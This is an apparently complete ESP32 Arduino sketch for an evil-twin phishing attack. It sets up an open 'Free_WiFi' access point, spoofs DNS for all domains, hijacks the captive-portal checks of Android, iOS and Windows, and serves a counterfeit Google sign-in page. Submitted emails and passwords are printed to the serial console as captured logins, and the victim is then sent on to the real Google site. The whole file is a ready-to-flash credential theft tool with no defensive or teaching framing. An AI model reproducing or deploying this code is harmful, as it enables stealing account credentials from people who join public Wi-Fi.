#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// AP config
const char* ssid = "Free_WiFi";
const char* password = "";

// Gmail-style phishing page
String loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Sign in – Google accounts</title>
  <style>
    body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 320px;
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 12px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-btn {
      background-color: #1a73e8;
      color: white;
      border: none;
      font-size: 16px;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" class="logo">
    <h2>Sign in</h2>
    <form action="/login" method="POST">
      <input type="email" name="username" placeholder="Email or phone" required><br>
      <input type="password" name="password" placeholder="Enter your password" required><br>
      <input type="submit" class="login-btn" value="Next">
    </form>
  </div>
</body>
</html>
)rawliteral";

// Captive portal redirect
void handleCaptive() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");

  Serial.println("===== LOGIN CAPTURED =====");
  Serial.print("Email: ");
  Serial.println(username);
  Serial.print("Password: ");
  Serial.println(password);
  Serial.println("==========================");

  // Redirect to real Google
  server.sendHeader("Location", "https://accounts.google.com", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));

  Serial.println("Fake AP started");
  Serial.print("SSID: "); Serial.println(ssid);
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());

  // DNS spoofing - all domains to ESP32
  dnsServer.start(DNS_PORT, "*", apIP);

  // Captive triggers for Android, iOS, Windows
  server.on("/generate_204", handleCaptive);       // Android
  server.on("/fwlink", handleCaptive);             // Windows
  server.on("/hotspot-detect.html", handleCaptive); // Apple
  server.on("/ncsi.txt", handleCaptive);           // Windows
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleRoot);

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
